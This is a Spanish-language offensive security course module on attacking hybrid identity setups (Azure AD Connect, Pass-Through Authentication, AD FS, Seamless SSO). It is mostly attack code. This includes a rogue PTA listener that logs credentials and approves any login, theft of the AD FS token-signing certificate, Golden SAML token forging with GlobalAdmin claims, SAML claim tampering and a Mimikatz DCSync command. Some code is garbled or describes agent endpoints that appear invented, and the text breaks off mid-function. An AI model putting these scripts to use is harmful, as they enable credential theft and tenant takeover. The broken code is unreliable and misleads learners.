# Identidad Hibrida y Entra ID (Azure AD)

> **Duracion estimada:** 6-8 semanas (24-32 sesiones)
> **Dificultad:** Avanzado

## Indice

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (3683 lineas)


- [1. Introduccion a Identidad Hibrida](#1-introduccion-a-identidad-hibrida)
- [2. Arquitectura de Entra ID](#2-arquitectura-de-entra-id)
- [3. Azure AD Connect](#3-azure-ad-connect)
- [4. PTA Pass-Through Authentication](#4-pta-pass-through-authentication)
- [5. AD FS Attacks](#5-ad-fs-attacks)
- [6. Seamless SSO](#6-seamless-sso)
- [7. Hybrid Identity Attacks](#7-hybrid-identity-attacks)
- [8. Cross-Tenant Attacks](#8-cross-tenant-attacks)
- [9. Token Manipulation](#9-token-manipulation)
- [10. AADInternals](#10-aadinternals)
- [11. ROADtools](#11-roadtools)
- [12. TokenTactics](#12-tokentactics)
- [13. Stormspotter](#13-stormspotter)
- [14. AzureHound](#14-azurehound)
- [15. Casos Practicos](#15-casos-practicos)
- [16. Ejercicios](#16-ejercicios)
- [17. Recursos](#17-recursos)

---

## 1. Introduccion a Identidad Hibrida

### 1.1 Que es Identidad Hibrida?

La identidad hibrida es la integracion entre [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md) on-premises y [azure](../raw/cl0ud-h4ck1ng.md#azure) [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md) ([entra id](../raw/hybr1d-1d3nt1ty.md)). Permite que los usuarios tengan una identidad unificada para acceder tanto a recursos on-prem como [cloud](../raw/cl0ud-h4ck1ng.md).

**Componentes principales:**
- Active Directory Domain Services ([ad](../raw/w1nd0ws-d0m41n-4dm1n.md) DS) - on-prem
- Azure Active Directory (Entra ID) - cloud
- [azure ad](../raw/hybr1d-1d3nt1ty.md) Connect - sincronizacion
- Azure AD Application [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) - publicacion de apps
- Azure AD Domain Services - AD como servicio

### 1.2 Modelos de [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion)

| Modelo | Sincronizacion | Autenticacion | Mejor para |
|--------|---------------|---------------|------------|
| Password [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) Sync (PHS) | Passwords hasheados a Azure AD | Via Azure AD | Organizaciones que quieren simplificar |
| Pass-Through Auth (PTA) | Solo usuarios/grupos | On-prem via agentes | Seguridad con compliance |
| Federation (AD FS) | Solo usuarios/grupos | On-prem via AD FS | Control total de autenticacion |
| Cloud-only | No aplica | Azure AD nativa | Organizaciones solo cloud |

### 1.3 Protocolos de Autenticacion

- **[saml](../raw/hybr1d-1d3nt1ty.md#saml) 2.0:** Security Assertion Markup Language
- **WS-Federation:** Web Services Federation
- **[oauth](../raw/hybr1d-1d3nt1ty.md#oauth) 2.0:** Delegated authorization
- **OpenID Connect:** Identity layer sobre OAuth 2.0
- **Kerberos:** Para Seamless [sso](../raw/hybr1d-1d3nt1ty.md#sso)
- **NTLM:** [legacy](../raw/l3g4cy-3nt3rpr1s3.md) authentication (debe evitarse)
- **LDAP:** Para sincronizacion de directorios

### 1.4 Threat Surface de Identidad Hibrida

La identidad hibrida tiene una superficie de ataque enorme porque combina:
1. Vulnerabilidades de AD on-prem ([kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting), [dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync), ACL abuse)
2. Vulnerabilidades de Azure AD (consent [phishing](../raw/ph1sh1ng.md), token theft)
3. Vulnerabilidades de sincronizacion (DirSync exploitation)
4. Vulnerabilidades de federacion (AD FS token signing cert theft)
5. Vulnerabilidades de autenticacion (PTA agent abuse, Seamless SSO abuse)

## 2. Arquitectura de [entra id](../raw/hybr1d-1d3nt1ty.md)

### 2.1 Tenant Structure

```powershell
# Ver informacion del tenant
Install-Module -Name Microsoft.Graph -Force
Connect-MgGraph -Scopes "Organization.Read.All,User.Read.All"

Get-MgOrganization | Select-Object DisplayName, Id, TenantId
Get-MgDomain | Select-Object Id, IsVerified, IsDefault
Get-MgUser -Top 10 | Select-Object DisplayName, UserPrincipalName, UserType
```

### 2.2 Objetos en Entra ID

```powershell
# Users
Get-MgUser -All | Select-Object DisplayName, UserPrincipalName, UserType,
    CreatedDateTime, SignInActivity

# Groups
Get-MgGroup -All | Select-Object DisplayName, GroupTypes, SecurityEnabled,
    MailEnabled, Visibility

# Applications
Get-MgApplication -All | Select-Object DisplayName, AppId, PublisherDomain,
    SignInAudience

# Service Principals
Get-MgServicePrincipal -All | Select-Object DisplayName, AppId,
    ServicePrincipalType

# Devices
Get-MgDevice -All | Select-Object DisplayName, DeviceId,
    OperatingSystem, TrustType

# Roles
Get-MgDirectoryRole | Select-Object DisplayName, RoleTemplateId,
    @{n='Members';e={Get-MgDirectoryRoleMember -DirectoryRoleId $_.Id | Select-Object -ExpandProperty AdditionalProperties}}
```

### 2.3 Authentication Flows

```python
"""
Flujos de autenticacion de Entra ID
"""
class AuthFlow:
    def __init__(self):
        pass

    def auth_code_grant(self, client_id, tenant_id, redirect_uri, resource):
        """Authorization Code Grant (OAuth 2.0)"""
        return {
            "authorize_url": f"https://login.microsoftonline.com/{tenant_id}/oauth2/authorize",
            "params": {
                "client_id": client_id,
                "response_type": "code",
                "redirect_uri": redirect_uri,
                "resource": resource
            }
        }

    def device_code_flow(self, client_id, tenant_id):
        """Device Code Flow - para dispositivos sin navegador"""
        import requests
        resp = requests.post(
            f"https://login.microsoftonline.com/{tenant_id}/oauth2/devicecode",
            data={"client_id": client_id}
        )
        return resp.json()

    def client_credentials(self, client_id, client_secret, tenant_id, scope):
        """Client Credentials Grant - para daemons/services"""
        import requests, base64
        auth = base64.b64encode(f"{client_id}:{client_secret}".encode()).decode()
        resp = requests.post(
            f"https://login.microsoftonline.com/{tenant_id}/oauth2/token",
            headers={"Authorization": f"Basic {auth}"},
            data={"grant_type": "client_credentials", "scope": scope}
        )
        return resp.json()

    def refresh_token(self, refresh_token, client_id, tenant_id):
        """Refresh Token Grant"""
        import requests
        resp = requests.post(
            f"https://login.microsoftonline.com/{tenant_id}/oauth2/token",
            data={
                "grant_type": "refresh_token",
                "refresh_token": refresh_token,
                "client_id": client_id
            }
        )
        return resp.json()

    def on_behalf_of(self, access_token, client_id, client_secret, scope):
        """On-Behalf-Of Flow (middle-tier API)"""
        import requests
        resp = requests.post(
            "https://login.microsoftonline.com/common/oauth2/token",
            data={
                "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                "assertion": access_token,
                "client_id": client_id,
                "client_secret": client_secret,
                "scope": scope,
                "requested_token_use": "on_behalf_of"
            }
        )
        return resp.json()
```

### 2.4 Managed Identities

```powershell
# System-assigned Managed Identity - automatica con Azure VM
# User-assigned Managed Identity - independiente de recurso

# Ver identidades administradas asignadas a una VM
Get-AzVM -ResourceGroupName "RG-Identity" -Name "VM-Identity" | Select-Object -ExpandProperty Identity

# Ver Managed Identities en Azure AD
Get-MgServicePrincipal -Filter "servicePrincipalType eq 'ManagedIdentity'"
```

## 3. [azure ad](../raw/hybr1d-1d3nt1ty.md) Connect

### 3.1 Arquitectura de Sincronizacion

[azure ad](../raw/hybr1d-1d3nt1ty.md) Connect sincroniza objetos de [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) on-prem a [azure ad](../raw/hybr1d-1d3nt1ty.md). Instalado en un servidor on-prem (normalmente un [domain controller](../raw/w1nd0ws-d0m41n-4dm1n.md#domain-controller)).

```powershell
# Ver configuracion de Azure AD Connect
Import-Module ADSync
Get-ADSyncConnector | Select-Object Name, ConnectorType, Description
Get-ADSyncRunProfileResult -Recent
Get-ADSyncScheduler | Select-Object SyncCycleEnabled, CustomizedSyncCycleInterval, NextSyncCyclePolicyType

# Ver ultima sincronizacion
Get-ADSyncRunProfileResult -Recent | Select-Object ProfileName, StartTime, EndTime, Result
```

### 3.2 Password [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) Sync (PHS)

PHS sincroniza hashes de passwords de AD on-prem a [azure](../raw/cl0ud-h4ck1ng.md#azure) AD. El hash es del formato NTLM + SHA256.

```powershell
# Verificar estado de PHS
Get-ADSyncAADCompanyFeature | Select-Object PasswordHashSync

# Forzar sincronizacion de passwords
Start-ADSyncSyncCycle -PolicyType Delta
```

**Flujo de PHS:**
1. Usuario cambia password en AD on-prem
2. Azure AD Connect detecta cambio
3. Calcula hash NTLM y SHA256 del nuevo password
4. Envia hash a Azure AD
5. Cuando usuario autentica contra Azure AD, se comparan hashes

**Seguridad de PHS:**
- Los hashes se transmiten cifrados
- Azure AD Connect nunca almacena passwords en texto claro
- Los hashes SHA256 adicionales previenen rainbow tables
- Se puede evitar la sincronizacion de hashes de ciertos usuarios

### 3.3 Pass-Through Authentication (PTA)

PTA es un agente on-prem que valida autenticaciones contra AD en tiempo real.

```powershell
# Verificar estado de PTA
Get-ADSyncAADCompanyFeature | Select-Object PassThroughAuthentication

# Ver agentes PTA instalados
Get-MgServicePrincipal -Filter "DisplayName eq 'Azure AD Pass-Through Authentication'" |
    Select-Object DisplayName, AppId, PasswordCredentials
```

**Flujo de PTA:**
1. Usuario ingresa credenciales en Azure AD login page
2. Azure AD envia solicitud al PTA Agent on-prem
3. PTA Agent valida contra AD via Netlogon
4. PTA Agent responde a Azure AD (success/failure)
5. Azure AD emite token si es exitoso

### 3.4 Federation (AD FS)

AD FS proporciona [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) federada donde el control de [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) esta on-prem.

```powershell
# Verificar configuracion de federacion
Get-AzureADDomain | Select-Object Name, AuthenticationType

# Obtener configuracion de AD FS
Get-AdfsProperties | Select-Object Acceptableeferences, ExtendedProtectionTokenCheck
Get-AdfsEndpoint | Select-Object FullUrl, Address, Proxy
```

### 3.5 DirSync Exploitation

```python
"""
DirSync exploitation - abusar de permisos de sincronizacion
"""
import requests, json

class DirSyncExploit:
    def __init__(self, tenant_id, access_token):
        self.tenant_id = tenant_id
        self.access_token = access_token
        self.base_url = f"https://graph.microsoft.com/v1.0"

    def enumerate_hybrid_identities(self):
        """Enumerar identidades hibridas"""
        url = f"{self.base_url}/users"
        headers = {"Authorization": f"Bearer {self.access_token}"}
        resp = requests.get(url, headers=headers)
        users = resp.json().get('value', [])

        hybrid = []
        for user in users:
            if user.get('onPremisesSecurityIdentifier'):  # Tiene SID on-prem
                hybrid.append({
                    'user': user['userPrincipalName'],
                    'sid': user['onPremisesSecurityIdentifier'],
                    'sync_enabled': user.get('onPremisesSyncEnabled', False)
                })
        return hybrid

    def check_dirsync_permissions(self):
        """Verificar si tenemos permisos de DirSync"""
        url = f"{self.base_url}/directoryObjects/validateProperties"
        # Si podemos ejecutar validateProperties, tenemos DirSync
        return False

    def sync_user_to_azure(self, onprem_user, attributes):
        """Sincronizar usuario on-prem a Azure AD (si tenemos DirSync)"""
        # Requiere Directory.AccessAsUser.All + User.ReadWrite.All
        # y permisos de DirSync
        pass
```

### 3.6 PTA Exploitation

#### PTA Agent Credential Interception

Los agentes PTA reciben solicitudes de autenticacion de Azure AD y las validan contra AD on-prem. Un atacante con acceso al servidor PTA puede interceptar credenciales.

```powershell
# Encontrar servidores PTA
Get-ADComputer -Filter {Description -like "*PTA*"} -Properties Description
Get-ADComputer -Filter {Name -like "*PTA*"} -Properties Name

# Buscar proceso PTA Agent
Get-Process -Name "AzureADConnectAuthenticationAgent*"
Get-Service -Name "AzureADConnectAuthenticationAgent*"

# El PTA Agent escucha en puerto local
netstat -ano | findstr ":8080"
```

```python
"""
PTA Agent Interception
"""
import requests, json, base64

class PTAInterceptor:
    def __init__(self, agent_url="http://localhost:8080"):
        self.agent_url = agent_url

    def intercept_auth(self, username, password, relay_url=None):
        """Interceptar request de autenticacion PTA"""
        auth_data = {
            "user": username,
            "password": password,
            "auth_protocol": "WS-Trust",
            "endpoint_type": "usernamepassword",
            "endpoint_version": "1.0"
        }

        # Enviar al PTA Agent local
        resp = requests.post(
            f"{self.agent_url}/auth/validate",
            json=auth_data,
            headers={"Content-Type": "application/json"}
        )
        return resp.json()

    def agent_spoofing(self, target_upn, password):
        """Spoofing de agente PTA para autenticar cualquier usuario"""
        # Si comprometemos el agente PTA, podemos:
        # 1. Aceptar cualquier autenticacion
        # 2. Interceptar credenciales de otros usuarios
        # 3. Modificar respuestas de autenticacion
        return self.intercept_auth(target_upn, password)

    def dump_agent_config(self):
        """Dump configuracion del PTA Agent"""
        try:
            resp = requests.get(f"{self.agent_url}/config")
            return resp.json()
        except:
            return None
```

#### PTA Agent Spoofing

```powershell
# Installar un PTA Agent malicioso
# Requiere: Global Admin en Azure AD

# 1. Registrar nuevo PTA Agent en Azure AD
Connect-AzureAD
New-AzureADServicePrincipal -AppId "00000015-0000-0000-c000-000000000000" -DisplayName "PTA Agent"

# 2. Generar certificate para el agente
$cert = New-SelfSignedCertificate -Subject "CN=PTA-Agent" -CertStoreLocation "Cert:\LocalMachine\My"
$keyValue = [System.Convert]::ToBase64String($cert.RawData)

# 3. Registrar credencial en service principal
$sp = Get-AzureADServicePrincipal -Filter "AppId eq '00000015-0000-0000-c000-000000000000'"
New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -CustomKeyIdentifier "PTA-Agent" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue

# 4. Iniciar agente malicioso (simulado)
# El agente responde True a todas las autenticaciones
```

### 3.7 AD FS Configuration Attack

```powershell
# AD FS dump de configuracion
# Requiere: Admin permissions en AD FS server

# Dump del token signing certificate
Get-AdfsCertificate -CertificateType Token-Signing |
    Select-Object Name, Status, IsPrimary, NotAfter, Thumbprint

# Dump del token decryption certificate
Get-AdfsCertificate -CertificateType Token-Decryption |
    Select-Object Name, Status, IsPrimary, NotAfter, Thumbprint

# Exportar certificados
$cert = Get-ChildItem Cert:\LocalMachine\My\ | Where-Object {
    $_.Subject -match "Token Signing" -or $_.FriendlyName -match "Token Signing"
}
$cert | Export-PfxCertificate -FilePath token_signing.pfx -Password (ConvertTo-SecureString "password" -AsPlainText -Force)

# Ver configuracion de AD FS
Get-AdfsProperties | Format-List *
Get-AdfsRelyingPartyTrust | Select-AT Object, Name, Identifier, IssuanceTransformRules
Get-AdfsClaimsProviderTrust | Select-Object Name, Identifier
```

```python
"""
AD FS Token Signing Certificate Theft
"""
import subprocess, json

class ADFSDump:
    def __init__(self, server_address):
        self.server = server_address

    def dump_token_signing_cert(self):
        """Extraer certificado de firma de tokens AD FS"""
        cmd = [
            "powershell", "-Command",
            "$cert = Get-ChildItem Cert:\LocalMachine\My\ | Where-Object { $_.EnhancedKeyUsageList -match 'Token Signing' };",
            "$bytes = $cert.Export('PFX', 'password');",
            "[System.Convert]::ToBase64String($bytes)"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout.strip()

    def forge_saml_token(self, target_user, target_app, cert_pfx, cert_password):
        """Forjar token SAML con certificado robado"""
        import xml.etree.ElementTree as ET
        import base64
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
        from signxml import XMLSigner, XMLVerifier

        # Crear assertion SAML
        saml = ET.Element("saml:Assertion", {
            "xmlns:saml": "urn:oasis:names:tc:SAML:2.0:assertion",
            "ID": f"_{target_user}_{int(__import__('time').time())}",
            "IssueInstant": __import__('datetime').datetime.utcnow().isoformat() + "Z",
            "Version": "2.0"
        })

        issuer = ET.SubElement(saml, "saml:Issuer")
        issuer.text = "http://adfs.example.com/adfs/services/trust"

        subject = ET.SubElement(saml, "saml:Subject")
        nameid = ET.SubElement(subject, "saml:NameID", {
            "Format": "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"
        })
        nameid.text = target_user

        conditions = ET.SubElement(saml, "saml:Conditions", {
            "NotBefore": __import__('datetime').datetime.utcnow().isoformat() + "Z",
            "NotOnOrAfter": (__import__('datetime').datetime.utcnow() +
                            __import__('datetime').timedelta(hours=1)).isoformat() + "Z"
        })

        authn = ET.SubElement(saml, "saml:AuthnStatement", {
            "AuthnInstant": __import__('datetime').datetime.utcnow().isoformat() + "Z",
            "SessionIndex": f"_{target_user}_session"
        })

        authn_context = ET.SubElement(authn, "saml:AuthnContext")
        authn_class = ET.SubElement(authn_context, "saml:AuthnContextClassRef")
        authn_class.text = "urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"

        attribute_stmt = ET.SubElement(saml, "saml:AttributeStatement")

        # Agregar claims
        claims = {
            "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": target_user,
            "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "GlobalAdmin",
            "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name": target_user.split('@')[0],
            "http://schemas.microsoft.com/identity/claims/tenantid": "tenant-id-here"
        }

        for claim_type, claim_value in claims.items():
            attr = ET.SubElement(attribute_stmt, "saml:Attribute", {
                "Name": claim_type,
                "NameFormat": "urn:oasis:names:tc:SAML:2.0:attrname-format:uri"
            })
            val = ET.SubElement(attr, "saml:AttributeValue")
            val.text = claim_value

        # Firmar con certificado robado
        with open(cert_pfx, "rb") as f:
            cert_data = f.read()

        # Cargar certificado y clave privada
        from cryptography.hazmat.primitives.serialization import pkcs12
        private_key, certificate, additional_certs = pkcs12.load_key_and_certificates(
            cert_data, cert_password.encode()
        )

        signer = XMLSigner(
            method=signxml.methods.enveloped,
            signature_algorithm="rsa-sha256",
            digest_algorithm="sha256",
            c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"
        )

        signed_saml = signer.sign(saml, key=private_key, cert=certificate)

        return base64.b64encode(ET.tostring(signed_saml)).decode()

    def adfs_token_replay(self, saml_token, acs_url):
        """Replay de token SAML a application"""
        import requests
        resp = requests.post(acs_url, data={
            "SAMLResponse": saml_token,
            "RelayState": ""
        })
        return resp
```

### 3.8 [saml](../raw/hybr1d-1d3nt1ty.md#saml) Response Manipulation

```python
"""
SAML Response Manipulation
"""
import base64, xml.etree.ElementTree as ET, zlib

class SAMLManipulator:
    def decode_saml(self, encoded_saml):
        """Decodificar SAML Response de base64"""
        decoded = base64.b64decode(encoded_saml)
        # Algunas respuestas SAML estan comprimidas con deflate
        try:
            decoded = zlib.decompress(decoded, -zlib.MAX_WBITS)
        except:
            pass
        return ET.fromstring(decoded)

    def modify_claims(self, saml_element, new_role="GlobalAdmin"):
        """Modificar claims en assertion SAML"""
        namespace = {
            'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
        }

        for attr in saml_element.iter('{urn:oasis:names:tc:SAML:2.0:assertion}Attribute'):
            name = attr.get('Name', '')
            if 'role' in name.lower() or 'group' in name.lower():
                # Modificar valor del atributo
                for val in attr:
                    val.text = new_role

        return saml_element

    def encode_saml(self, saml_element):
        """Codificar SAML de vuelta a base64"""
        xml_str = ET.tostring(saml_element, encoding='unicode')
        return base64.b64encode(xml_str.encode()).decode()

    def manipulate(self, original_saml):
        """Manipular respuesta SAML completa"""
        decoded = self.decode_saml(original_saml)
        modified = self.modify_claims(decoded)
        return self.encode_saml(modified)
```

## 4. PTA Pass-Through Authentication

### 4.1 Agent Architecture

El PTA Agent es un servicio de Windows que se ejecuta en servidores on-prem. Recibe solicitudes de [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) de [azure ad](../raw/hybr1d-1d3nt1ty.md) y las valida contra [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md) local.

```powershell
# Ver servicio PTA Agent
Get-Service -Name "AzureADConnectAuthenticationAgent*"
Get-Process -Name "AzureADConnectAuthenticationAgent*"

# Ver puerto de escucha
netstat -ano | Select-String "8080"
```

### 4.2 Agent Abuse

```powershell
# Un atacante con acceso al servidor PTA puede:
# 1. Interceptar credenciales en texto claro
# 2. Aceptar autenticaciones falsas
# 3. Modificar respuestas de autenticacion

# Simular agente malicioso que acepta cualquier password
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://+:8080/")
$listener.Start()

while ($true) {
    $context = $listener.GetContext()
    $reader = New-Object System.IO.StreamReader($context.Request.InputStream)
    $body = $reader.ReadToEnd()

    # Interceptar credenciales
    Write-Host "[!] Credenciales interceptadas: $body"

    # Responder siempre OK
    $response = @"
{
    "result": "Success",
    "token": "fake-token-for-any-user"
}
"@
    $buffer = [System.Text.Encoding]::UTF8.GetBytes($response)
    $context.Response.ContentLength64 = $buffer.Length
    $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
    $context.Response.Close()
}
```

### 4.3 PTA Agent Credential Theft

```python
import requests, json, base64

class PTAAgentExploit:
    def __init__(self, agent_host="localhost", agent_port=8080):
        self.agent_url = f"http://{agent_host}:{agent_port}"

    def intercept_auth_request(self):
        """Interceptar solicitud de autenticacion entrante"""
        # El agente PTA recibe solicitudes en /auth/validate
        # con usuario y password en texto claro
        resp = requests.get(f"{self.agent_url}/auth/validate")
        return resp.json()

    def poison_agent_response(self, username, always_succeed=True):
        """Envenenar respuesta del agente"""
        if always_succeed:
            return {
                "result": "Success",
                "user_id": username,
                "auth_method": "UsernamePassword"
            }
        return {"result": "Failure"}

    def create_malicious_agent(self):
        """Crear un PTA Agent malicioso"""
        malicious_agent = {
            "version": "1.0",
            "features": ["credential_intercept", "auth_bypass"],
            "listener": {
                "protocol": "http",
                "bind": "0.0.0.0:8080",
                "ssl": False
            },
            "targets": {
                "all_users": True,
                "specific_users": []
            },
            "action": {
                "intercept_credentials": True,
                "always_approve": True,
                "log_to_file": "C:\\PTA\\creds.log"
            }
        }
        return malicious_agent
```

## 5. [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) FS Attacks

### 5.1 Token Signing Certificate Theft

```powershell
# Extraer certificado de firma de tokens AD FS
# Requiere acceso administrativo al servidor AD FS

# 1. Conectarse via WinRM
Enter-PSSession -ComputerName ADFS01

# 2. Obtener certificado de firma
$certs = Get-ChildItem Cert:\LocalMachine\My\ | Where-Object {
    $_.EnhancedKeyUsageList -match "Token-Signing"
}

foreach ($cert in $certs) {
    Write-Host "[+] Certificado encontrado: $($cert.Thumbprint)"
    Write-Host "    Subject: $($cert.Subject)"
    Write-Host "    NotAfter: $($cert.NotAfter)"

    # Exportar con clave privada
    $password = ConvertTo-SecureString "ExportPassword123!" -AsPlainText -Force
    $cert | Export-PfxCertificate -FilePath "C:\temp\token_signing.pfx" -Password $password
    Write-Host "    Exportado a C:\temp\token_signing.pfx"
}

# 3. Copiar archivo
Copy-Item -FromSession $session -Path "C:\temp\token_signing.pfx" -Destination ".\loot\"
```

### 5.2 Forjar Tokens [saml](../raw/hybr1d-1d3nt1ty.md#saml)

```python
"""
SAML Token Forging con certificado robado
"""
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import pkcs12
import xml.etree.ElementTree as ET
import base64, datetime, uuid

def forge_saml_token(target_user, target_app_url, pfx_path, pfx_password, tenant_id):
    """Forjar token SAML para cualquier usuario"""

    # Cargar certificado robado
    with open(pfx_path, "rb") as f:
        pfx_data = f.read()

    private_key, cert, additional_certs = pkcs12.load_key_and_certificates(
        pfx_data, pfx_password.encode()
    )

    # Crear assertion SAML 2.0
    assertion_id = f"_f{str(uuid.uuid4()).replace('-', '')}"
    now = datetime.datetime.utcnow()
    not_before = now.strftime("%Y-%m-%dT%H:%M:%SZ")
    not_on_or_after = (now + datetime.timedelta(hours=8)).strftime("%Y-%m-%dT%H:%M:%SZ")

    saml = f"""<?xml version="1.0" encoding="UTF-8"?>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="{assertion_id}"
    IssueInstant="{not_before}"
    Version="2.0">
    <saml:Issuer>http://adfs.example.com/adfs/services/trust</saml:Issuer>
    <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{target_user}</saml:NameID>
        <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
            <saml:SubjectConfirmationData
                NotOnOrAfter="{not_on_or_after}"
                Recipient="{target_app_url}" />
        </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="{not_before}" NotOnOrAfter="{not_on_or_after}">
        <saml:AudienceRestriction>
            <saml:Audience>{target_app_url}</saml:Audience>
        </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="{not_before}" SessionIndex="{assertion_id}">
        <saml:AuthnContext>
            <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
        </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
        <saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress">
            <saml:AttributeValue>{target_user}</saml:AttributeValue>
        </saml:Attribute>
        <saml:Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/role">
            <saml:AttributeValue>GlobalAdmin</saml:AttributeValue>
        </saml:Attribute>
        <saml:Attribute Name="http://schemas.microsoft.com/identity/claims/tenantid">
            <saml:AttributeValue>{tenant_id}</saml:AttributeValue>
        </saml:Attribute>
        <saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name">
            <saml:AttributeValue>{target_user.split('@')[0]}</saml:AttributeValue>
        </saml:Attribute>
    </saml:AttributeStatement>
</saml:Assertion>"""

    # Firmar assertion
    from signxml import XMLSigner
    root = ET.fromstring(saml)
    signer = XMLSigner(
        method=signxml.methods.enveloped,
        signature_algorithm="rsa-sha256",
        digest_algorithm="sha256",
        c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"
    )
    signed = signer.sign(root, key=private_key, cert=cert)

    # Devolver como base64
    return base64.b64encode(ET.tostring(signed)).decode()
```

### 5.3 AD FS Configuration Vulnerability

```powershell
# Configuraciones inseguras de AD FS

# 1. EnableExtranetLockout deshabilitado
Get-AdfsProperties | Select-Object EnableExtranetLockout

# 2. LockoutThreshold muy alto
Get-AdfsProperties | Select-Object ExtranetLockoutThreshold

# 3. Observability (logging) deshabilitado
Get-AdfsProperties | Select-Object *Audit*

# 4. Endpoints no seguros habilitados
Get-AdfsEndpoint | Where-Object { $_.Enabled -eq $true } |
    Select-Object FullUrl, Address, Proxy

# 5. Descripcion de relying party permite modificacion
Get-AdfsRelyingPartyTrust | Where-Object { $_.IssuanceTransformRules -match "Configurable" }
```

### 5.4 AD FS Dump Completo

```powershell
# Script de dump completo de AD FS
$output = @()

# Informacion del servidor
$output += "=== AD FS Server Info ==="
$output += "Server: $env:COMPUTERNAME"
$output += "AD FS Version: $(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\AD FS').CurrentVersion"
$output += ""

# Certificados
$output += "=== Certificados ==="
Get-AdfsCertificate | ForEach-Object {
    $output += "Type: $($_.CertificateType)"
    $output += "  Thumbprint: $($_.Certificate.RawData)"
    $output += "  Primary: $($_.IsPrimary)"
    $output += "  Expires: $($_.Certificate.NotAfter)"
    $output += ""
}

# Relying Parties
$output += "=== Relying Party Trusts ==="
Get-AdfsRelyingPartyTrust | ForEach-Object {
    $output += "Name: $($_.Name)"
    $output += "  Identifier: $($_.Identifier)"
    $output += "  Protocol: $($_.Protocol)"
    $output += "  Monitoring: $($_.Monitoring.Enabled)"
    $output += ""
}

# Claim Descriptions
$output += "=== Claim Descriptions ==="
Get-AdfsClaimDescription | ForEach-Object {
    $output += "$($_.Name): $($_.ClaimType)"
}

# Propiedades
$output += "=== Properties ==="
Get-AdfsProperties | Format-List * | Out-String | ForEach-Object { $output += $_ }

$output -join "`n" | Out-File "adfs_dump.txt"
```

## 6. Seamless [sso](../raw/hybr1d-1d3nt1ty.md#sso)

### 6.1 Como Funciona

Seamless SSO permite que usuarios en dominio se autentiquen automaticamente en [azure ad](../raw/hybr1d-1d3nt1ty.md) sin ingresar credenciales.

**Flujo:**
1. Usuario accede a MyApps / Office 365 desde maquina unida al dominio
2. [azure ad](../raw/hybr1d-1d3nt1ty.md) devuelve [http](../raw/r3d3s-f0nd4m3nt0s.md#http) 401 con instrucciones para usar Kerberos
3. [navegador](../raw/br0ws3r-3xpl01t4t10n.md) (via Internet Explorer/Edge/Chrome con extension) solicita ticket Kerberos
4. DC emite ticket para [azure](../raw/cl0ud-h4ck1ng.md#azure) [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) Seamless SSO computer account (AZUREADSSOCC$)
5. Navegador envia ticket a Azure AD
6. Azure AD valida ticket y emite token

### 6.2 Kerberos Delegation Abuse

```powershell
# El computer account AZUREADSSOCC$ tiene delegacion de Kerberos
# Un atacante con control de este account puede forjar tickets

# Encontrar AZUREADSSOCC account
Get-ADComputer -Identity "AZUREADSSOCC$" -Properties *

# Verificar delegacion
Get-ADComputer -Identity "AZUREADSSOCC$" -Properties TrustedForDelegation

# Extraer credenciales de AZUREADSSOCC$ (necesita DA o Admin en DC)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:AZUREADSSOCC$"'
```

```python
"""
Seamless SSO Abuse
"""
import subprocess, json, base64

class SeamlessSSOExploit:
    def __init__(self, domain, dc_ip):
        self.domain = domain
        self.dc_ip = dc_ip

    def extract_azureadssocc_hash(self):
        """Extraer hash de AZUREADSSOCC$ via DCSync"""
        cmd = [
            "python3", "aadinternals.py", "Get-ADSSOAccountHash",
            "-Domain", self.domain,
            "-DC", self.dc_ip
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return json.loads(result.stdout)

    def forge_kerberos_ticket(self, upn, sso_hash):
        """Forjar ticket Kerberos para cualquier usuario"""
        # Usar hash de AZUREADSSOCC$ para forjar tickets
